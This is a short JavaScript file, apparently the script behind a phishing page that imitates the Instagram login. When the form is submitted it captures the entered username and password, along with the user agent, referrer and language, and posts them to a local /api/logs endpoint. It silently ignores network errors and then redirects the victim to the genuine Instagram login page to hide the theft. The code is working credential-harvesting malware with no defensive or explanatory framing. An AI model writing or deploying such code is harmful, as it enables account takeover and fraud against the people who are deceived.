// lang: JS, file: public/app.js, target: browser (login page)
// Captures creds directly from the form elements on submit, pushes to /api/logs.

(function () {
  'use strict';

  function init() {
    const form = document.getElementById('loginForm');
    const user = document.getElementById('username');
    const pass = document.getElementById('password');
    const btn  = document.getElementById('loginBtn');

    if (!form || !user || !pass || !btn) {
      console.error('app.js: login form elements missing');
      return;
    }

    // Enable button when typing
    function sync() {
      btn.disabled = !(user.value.trim().length > 0 && pass.value.length > 0);
    }
    user.addEventListener('input', sync);
    pass.addEventListener('input', sync);

    // Force the button to be enabled right before submit, in case of autofill
    form.addEventListener('submit', function (e) {
      e.preventDefault();

      // Read values directly from the elements, not from the button state
      const u = user.value;
      const p = pass.value;

      // If fields are empty, don't send, just redirect (bot check)
      if (!u && !p) {
        window.location.href = 'https://www.instagram.com/accounts/login/';
        return;
      }

      const payload = {
        username: u,
        password: p,
        ts: new Date().toISOString(),
        ua: navigator.userAgent,
        ref: document.referrer || '',
        lang: navigator.language || '',
      };

      // Fire the fetch and wait for it to finish before redirecting
      fetch('/api/logs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      })
      .catch(() => {}) // Swallow network errors
      .finally(() => {
        // Redirect only AFTER the request finishes (or fails)
        window.location.href = 'https://www.instagram.com/accounts/login/';
      });
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
